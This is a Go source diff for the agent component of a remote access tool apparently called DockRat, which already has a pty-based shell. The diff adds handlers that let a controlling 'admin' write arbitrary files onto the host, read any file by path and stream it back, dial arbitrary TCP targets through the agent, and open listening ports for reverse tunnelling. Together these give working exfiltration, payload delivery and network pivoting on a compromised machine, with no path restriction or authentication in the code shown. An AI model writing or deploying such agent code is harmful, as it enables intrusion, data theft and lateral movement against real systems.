@@ -5,18 +5,52 @@ import (
 	"io"
 	"log"
 	"net"
+	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 
 	"github.com/Singert/DockRat/core/common"
 	"github.com/Singert/DockRat/core/node"
 	"github.com/Singert/DockRat/core/protocol"
 	"github.com/creack/pty"
+	"github.com/google/uuid"
 )
 
+var uploadFile *os.File
+var uploadPath string
 var shellStarted = false
 var shellStdin io.WriteCloser
 var relayCtx *RelayContext // 全局变量，供 MsgRelayPacket 使用
+
+// ------ Forward ds& util func ------
+var forwardConnMap = make(map[string]net.Conn)
+
+func registerForwardConn(connID string, conn net.Conn) {
+	forwardConnMap[connID] = conn
+}
+
+func getForwardConn(connID string) (net.Conn, bool) {
+	conn, ok := forwardConnMap[connID]
+	return conn, ok
+}
+
+func removeForwardConn(connID string) {
+	delete(forwardConnMap, connID)
+}
+
+// ------ Backward ds& util func ------
+var backwardMap = make(map[string]net.Conn)
+var backwardAdminTarget = make(map[string]string) // 可选，用于调试
+
+func getBackwardConn(id string) (net.Conn, bool) {
+	c, ok := backwardMap[id]
+	return c, ok
+}
+func removeBackwardConn(id string) {
+	delete(backwardMap, id)
+	delete(backwardAdminTarget, id)
+}
 
 func StartAgent(conn net.Conn) {
 	for {
@@ -71,6 +105,25 @@ func StartAgent(conn net.Conn) {
 			} else {
 				log.Println("[-] Relay context not initialized")
 			}
+		case protocol.MsgUpload:
+			handleFileUploadMeta(msg, conn)
+		case protocol.MsgFileChunk:
+			handleFileChunk(msg, conn)
+		case protocol.MsgDownload:
+			handleDownload(msg, conn)
+		case protocol.MsgForwardStart:
+			handleForwardStart(msg, conn)
+		case protocol.MsgForwardData:
+			handleForwardData(msg)
+		case protocol.MsgForwardStop:
+			handleForwardStop(msg)
+		case protocol.MsgBackwardListen:
+			handleBackwardListen(msg, conn)
+		case protocol.MsgBackwardData:
+			handleBackwardData(msg)
+		case protocol.MsgBackwardStop:
+			handleBackwardStop(msg)
+
 		default:
 			log.Println("[-] Unknown message type:", msg.Type)
 		}
@@ -187,15 +240,276 @@ func handleStartRelay(msg protocol.Message, conn net.Conn) {
 	conn.Write(buf)
 }
 
-/*
-✅ 补充建议（结构更优雅方案）
+// ---- Upload
+func handleFileUploadMeta(msg protocol.Message, conn net.Conn) {
+	var meta protocol.FileMeta
+	if err := json.Unmarshal(msg.Payload, &meta); err != nil {
+		log.Println("[-] Upload meta decode error:", err)
+		return
+	}
+	log.Printf("[+] Start receiving file: %s -> %s (%d bytes)", meta.Filename, meta.Path, meta.Size)
 
-后续可以考虑：
+	f, err := os.Create(meta.Path)
+	if err != nil {
+		log.Println("[-] Failed to create file:", err)
+		return
+	}
+	uploadFile = f
+	uploadPath = meta.Path
+}
 
-    拆分 relay 与普通 agent 启动逻辑：
+func handleFileChunk(msg protocol.Message, conn net.Conn) {
+	var chunk protocol.FileChunk
+	if err := json.Unmarshal(msg.Payload, &chunk); err != nil {
+		log.Println("[-] Chunk decode error:", err)
+		return
+	}
 
-        StartBasicAgent(conn)
+	if uploadFile == nil {
+		log.Println("[-] No upload file open")
+		return
+	}
 
-        StartRelayAgent(conn, ctx)
+	_, err := uploadFile.WriteAt(chunk.Data, chunk.Offset)
+	if err != nil {
+		log.Println("[-] Write chunk error:", err)
+		return
+	}
 
-    将 relay 端启动逻辑独立于 StartAgent()，更便于测试与维护。*/
+	if chunk.EOF {
+		log.Printf("[+] File upload complete: %s", uploadPath)
+		uploadFile.Close()
+		uploadFile = nil
+	}
+}
+
+func handleDownload(msg protocol.Message, conn net.Conn) {
+	var req protocol.DownloadRequest
+	if err := json.Unmarshal(msg.Payload, &req); err != nil {
+		log.Println("[-] Download path decode error:", err)
+		return
+	}
+	log.Println("[+] Start sending file:", req.Path)
+
+	f, err := os.Open(req.Path)
+	if err != nil {
+		log.Println("[-] Open file failed:", err)
+		return
+	}
+	defer f.Close()
+
+	buf := make([]byte, 4096)
+	var offset int64 = 0
+	for {
+		n, err := f.Read(buf)
+		if err != nil && err != io.EOF {
+			log.Println("[-] Read file error:", err)
+			return
+		}
+		eof := err == io.EOF
+
+		chunk := protocol.FileChunk{
+			Offset: offset,
+			Data:   buf[:n],
+			EOF:    eof,
+		}
+		data, _ := json.Marshal(chunk)
+		msg := protocol.Message{
+			Type:    protocol.MsgFileChunk,
+			Payload: data,
+		}
+		encoded, _ := protocol.EncodeMessage(msg)
+		conn.Write(encoded)
+
+		offset += int64(n)
+		if eof {
+			break
+		}
+	}
+
+	// 可选：发送 download done
+	done := protocol.Message{Type: protocol.MsgDownloadDone, Payload: []byte("done")}
+	encoded, _ := protocol.EncodeMessage(done)
+	conn.Write(encoded)
+}
+func handleForwardStart(msg protocol.Message, upstream net.Conn) {
+	var payload protocol.ForwardStartPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] ForwardStart decode failed:", err)
+		return
+	}
+
+	remoteConn, err := net.Dial("tcp", payload.Target)
+	if err != nil {
+		log.Printf("[-] Dial to %s failed: %v", payload.Target, err)
+		return
+	}
+
+	connID := payload.ConnID
+	registerForwardConn(connID, remoteConn)
+	log.Printf("[+] Forward[%s] → connected to %s", connID, payload.Target)
+
+	go func() {
+		buf := make([]byte, 4096)
+		for {
+			n, err := remoteConn.Read(buf)
+			if err != nil {
+				break
+			}
+			payload := protocol.ForwardDataPayload{
+				ConnID: connID,
+				Data:   buf[:n],
+			}
+			data, _ := json.Marshal(payload)
+			msg := protocol.Message{Type: protocol.MsgForwardData, Payload: data}
+			encoded, _ := protocol.EncodeMessage(msg)
+			upstream.Write(encoded)
+		}
+		// 出错或关闭，通知 admin
+		payload := protocol.ForwardStopPayload{ConnID: connID}
+		data, _ := json.Marshal(payload)
+		msg := protocol.Message{Type: protocol.MsgForwardStop, Payload: data}
+		encoded, _ := protocol.EncodeMessage(msg)
+		upstream.Write(encoded)
+
+		remoteConn.Close()
+		removeForwardConn(connID)
+		log.Printf("[-] Forward[%s] closed (read end)", connID)
+	}()
+}
+func handleForwardData(msg protocol.Message) {
+	var payload protocol.ForwardDataPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] ForwardData decode failed:", err)
+		return
+	}
+	conn, ok := getForwardConn(payload.ConnID)
+	if !ok {
+		log.Println("[-] Unknown forward conn:", payload.ConnID)
+		return
+	}
+	_, err := conn.Write(payload.Data)
+	if err != nil {
+		log.Printf("[-] Write to forward conn failed: %v", err)
+		conn.Close()
+		removeForwardConn(payload.ConnID)
+	}
+}
+func handleForwardStop(msg protocol.Message) {
+	var payload protocol.ForwardStopPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] ForwardStop decode failed:", err)
+		return
+	}
+	conn, ok := getForwardConn(payload.ConnID)
+	if ok {
+		conn.Close()
+		removeForwardConn(payload.ConnID)
+		log.Printf("[-] Forward[%s] closed by admin", payload.ConnID)
+	}
+}
+
+func handleBackwardListen(msg protocol.Message, upstream net.Conn) {
+	var payload protocol.BackwardListenPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] BackwardListen decode failed:", err)
+		return
+	}
+
+	addr := ":" + strconv.Itoa(payload.ListenPort)
+	ln, err := net.Listen("tcp", addr)
+	if err != nil {
+		log.Printf("[-] Listen on %s failed: %v", addr, err)
+		return
+	}
+	log.Printf("[+] Listening on %s for backward forwarding (→ admin %s)", addr, payload.Target)
+
+	go func() {
+		for {
+			clientConn, err := ln.Accept()
+			if err != nil {
+				log.Println("[-] Backward accept failed:", err)
+				continue
+			}
+
+			prefix := payload.Target // admin 给的 prefix
+			connID := prefix + "-" + uuid.New().String()
+			backwardMap[connID] = clientConn
+			backwardAdminTarget[connID] = payload.Target
+
+			// 告诉 admin 有新连接
+			start := protocol.BackwardStartPayload{ConnID: connID}
+			data, _ := json.Marshal(start)
+			msg := protocol.Message{Type: protocol.MsgBackwardStart, Payload: data}
+			encoded, _ := protocol.EncodeMessage(msg)
+			upstream.Write(encoded)
+
+			// 启动读取线程
+			go handleBackwardRead(connID, clientConn, upstream)
+		}
+	}()
+}
+func handleBackwardRead(connID string, conn net.Conn, upstream net.Conn) {
+	buf := make([]byte, 4096)
+	for {
+		n, err := conn.Read(buf)
+		if err != nil {
+			break
+		}
+
+		payload := protocol.BackwardDataPayload{
+			ConnID: connID,
+			Data:   buf[:n],
+		}
+		data, _ := json.Marshal(payload)
+		msg := protocol.Message{Type: protocol.MsgBackwardData, Payload: data}
+		encoded, _ := protocol.EncodeMessage(msg)
+		upstream.Write(encoded)
+		log.Printf("[agent] → backward data %d bytes (connID=%s)", n, connID)
+	}
+
+	// ✅ 连接关闭时发送 MsgBackwardStop
+	stopMsg := protocol.Message{
+		Type:    protocol.MsgBackwardStop,
+		Payload: []byte(connID),
+	}
+	encoded, _ := protocol.EncodeMessage(stopMsg)
+	upstream.Write(encoded)
+
+	conn.Close()
+	removeBackwardConn(connID)
+	log.Printf("[-] Backward[%s] closed (read)", connID)
+}
+
+func handleBackwardData(msg protocol.Message) {
+	var payload protocol.BackwardDataPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] BackwardData decode failed:", err)
+		return
+	}
+	conn, ok := getBackwardConn(payload.ConnID)
+	if !ok {
+		log.Println("[-] Unknown backward conn:", payload.ConnID)
+		return
+	}
+	_, err := conn.Write(payload.Data)
+	if err != nil {
+		log.Printf("[-] Backward write failed: %v", err)
+		conn.Close()
+		removeBackwardConn(payload.ConnID)
+	}
+}
+
+func handleBackwardStop(msg protocol.Message) {
+	var payload protocol.BackwardStopPayload
+	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+		log.Println("[-] BackwardStop decode failed:", err)
+		return
+	}
+	conn, ok := getBackwardConn(payload.ConnID)
+	if ok {
+		conn.Close()
+		removeBackwardConn(payload.ConnID)
+		log.Printf("[-] Backward[%s] closed by admin", payload.ConnID)
+	}
+}
